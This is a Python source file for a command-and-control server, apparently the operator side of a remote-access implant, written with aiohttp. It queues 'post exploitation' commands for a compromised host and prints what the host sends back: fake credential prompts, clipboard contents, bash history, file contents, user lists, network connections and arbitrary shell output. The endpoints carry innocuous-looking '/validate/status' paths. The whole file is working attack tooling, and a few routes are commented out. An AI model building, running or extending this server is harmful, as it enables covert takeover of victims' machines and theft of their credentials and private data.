# Author : Maximilien Schmitt-Laurin

from aiohttp import web
from datetime import datetime
import sys
from subprocess import PIPE, run


# Empty dictionary that will hold the C2 post exploitation commands
# for the target host that the operator will enter.

cmds = {}


# Return an OK response to the client.

async def InitCall(request):
    return web.Response(text='OK')



# This function is where the process of the operator entering C2 commands for the
# target client host starts. When the operator enters the 'done' command, all of 
# the commands entered by the operator (stored in the cmds dictionary) are
# returned to the client in the body of the HTTP response.

async def CheckIn(request):

    cmds.clear()


    # Get a tuple containing the host IP address and the port.

    peername = request.transport.get_extra_info('peername')


    host, port = peername

    cmdcounter = 0
    test = 'OK'

    print("\n\n Type 'help' to learn more about the built-in commands.\n")

    while True:

        command = input("\n [Source: %s] >>> " % str(peername))

        if 'help' in command:

            # Print help menu

            print("")
            print("-"*100)
            print("\n Help menu :")
            print("\n ---> ALIASES <---\n\n")
            print(" > systeminfo : Return useful system information\n")
            print(" > ls [directory] : List files and directories at a specific path\n")
            print(" > cat [filename] : View content of a specified file\n")
            print(" > download [filename] : After you cd to directory of interest, download files of interest (one at a time)\n")
            print(" > listusers : List local user accounts \n")
            print(" > ipconfig : Display the network configuration, refresh DHCP and DNS settings.\n")
            print(" > whoami : Show the host name and the user\n")
            print(" > lcwd : Show current server working directory\n")
            print(" > pwd : Show working directory on host\n")
            print("")
            print("\n ---> COMMANDS <---\n\n")
            print(" > prompt : Prompt the user to enter credentials\n")
            print(" > userhist : List the user's bash history\n")
            print(" > clipboard : Grab text in the user's clipboard\n")
            print(" > connections : Show active network connections\n")
            print(" > screenshot : Grap a screenshot of the host\n")
            print(" > sleep [digit] : Change sleep time\n")
            print(" > shell [shell command] : Run a shell command... NOT OPSEC SAFE, as this uses easily detectable command line strings.\n")
            print("")
            print("\n ---> OTHERS <---\n\n")
            print(" > done : Return all of the commands that were previously entered to the target client.\n")
            print(" > exit : Exit the session and stop the client\n")
            print("-"*100)
            print("")

        elif 'exit' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)
        
        elif 'lcwd' in command:

            print("\n Current server working directory:")
            result = run('cd', stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
            print(" " + result.stdout)
        
        elif (('pwd' in command) and ('shell' not in command)):

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif (('cat' in command) and ('shell' not in command)):

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'ls' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'whoami' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'connections' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif (('cd ' in command) and ('shell' not in command)):

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'ipconfig' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'listusers' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'userhist' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'screenshot' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'download ' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'prompt' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'systeminfo' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'clipboard' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'shell ' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif 'sleep ' in command:

            cmdcounter = cmdcounter + 1
            cmds["'%s'"%str(cmdcounter)] = command
            print("\n %s queued for execution on the endpoint at next checkin" % command)

        elif command == 'done':

            datalist = list(cmds.values())
            return web.json_response(datalist)
            break

        else:
            print("[-] Command not found")

    return web.Response(text=text)


# Server displays the results for each instruction executed on the target client
# to the operator with the following functions.

async def GetPath(request):

    path = await request.read()
    path = str(path).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Current directory path: %s" % str(path))
    text = 'OK'

    return web.Response(text=text)


async def Whoami(request):

    wdata = await request.read()
    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Current user identity: %s" % str(wdata.decode('utf8')))
    text = 'OK'
    return web.Response(text=text)


async def ListDir(request):

    listinfo = await request.read()
    listinfo = str(listinfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Results: \n")
    print("%s" % str(listinfo))
    text = 'OK'
    return web.Response(text=text)


async def ChangeDir(request):

    pathinfo = await request.read()
    timestmp = datetime.now()
    print("Timestamp: %s" % str(timestmp))
    print("[+] %s" % str(pathinfo))
    text = 'OK'
    return web.Response(text=text)


async def SysInfo(request):

    sysInfoData = await request.read()
    sysInfoData = str(sysInfoData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Basic system info: \n")
    print("%s" % str(sysInfoData))
    text = 'OK'
    return web.Response(text=text)


async def CatFile(request):

    fileData = await request.read()
    fileData = str(fileData).replace("b'", "").replace("\\\\", "\\").replace("\\'", "'").replace('\\n', '\n')
    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Content of the file: \n")
    print("%s" % str(fileData))
    text = 'OK'
    return web.Response(text=text)


async def ListUsers(request):

    listUsersInfo = await request.read()
    listUsersInfo = str(listUsersInfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Local User Accounts Found: \n")
    print("%s" % str(listUsersInfo))
    text = 'OK'
    return web.Response(text=text)


async def IpConfig(request):

    ipConfigInfo = await request.read()
    ipConfigInfo = str(ipConfigInfo).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Ipconfig Info: \n")
    print("%s" % str(ipConfigInfo))
    text = 'OK'
    return web.Response(text=text)


async def Clipboard(request):

    clipboard = await request.read()
    clipboard = str(clipboard).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Clipboard: \n")
    print(" %s" % str(clipboard))
    text = 'OK'
    return web.Response(text=text)


async def ConnData(request):

    connData = await request.read()
    connData = str(connData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Active Connections: \n")
    print(" %s" % str(connData))
    text = 'OK'
    return web.Response(text=text)


async def Prompt(request):

    promptData = await request.read()
    promptData = str(promptData).replace("b'", "").replace("\\\\", "\\").replace("\\n", "").replace("'", "")

    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] Prompt Data : \n")
    print(" %s" % str(promptData))
    text = 'OK'
    return web.Response(text=text)


async def UserHist(request):

    userHistData = await request.read()
    userHistData = str(userHistData).replace("b'", "").replace("\\\\", "\\").replace("'", "").replace('\\n', '\n')
    timestmp = datetime.now()
    print("\n\n Timestamp: %s" % str(timestmp))
    print(" [+] User's bash history: \n")
    print("%s" % str(userHistData))
    text = 'OK'
    return web.Response(text=text)


# Create a web application

app = web.Application()



# Define the API endpoints for our server.

# Each route includes the http method, the url endpoint and the function that
# corresponds to that endpoint.

app.add_routes([
    web.get('/initialize/sequence/0', InitCall),
    web.get('/validate/status', CheckIn),
    #web.post('/validate/status/1', GetScreenshot),
    #web.get('/validate/status/2', GetDownload),
    web.post('/validate/status/3', GetPath),
    #web.post('/validate/status/4', ChangeDir),
    web.post('/validate/status/5', ListDir),
    web.post('/validate/status/6', Clipboard),
    web.post('/validate/status/7', Prompt),
    web.post('/validate/status/8', ConnData),
    web.post('/validate/status/9', IpConfig),
    web.post('/validate/status/10', ListUsers),
    web.post('/validate/status/11', UserHist),
    web.post('/validate/status/13', Whoami),
    web.post('/validate/status/14', SysInfo),
    web.post('/validate/status/15', CatFile),
    #web.post('/validate/status/16', ShellCmd),
    #web.post('/validate/status/17', Sleeper),
])




if __name__ == '__main__':
    
    portValue = 7000

    try:
        web.run_app(app, port=portValue)

    except OSError as error:

        print(f"\n Port {portValue} cannot be used for the C2 server. It's either already used by another program or it needs elevated superuser privileges.\n")
        exit()

    except:

        print("\n The program was interrupted due to an unexpected error.\n")
        exit()
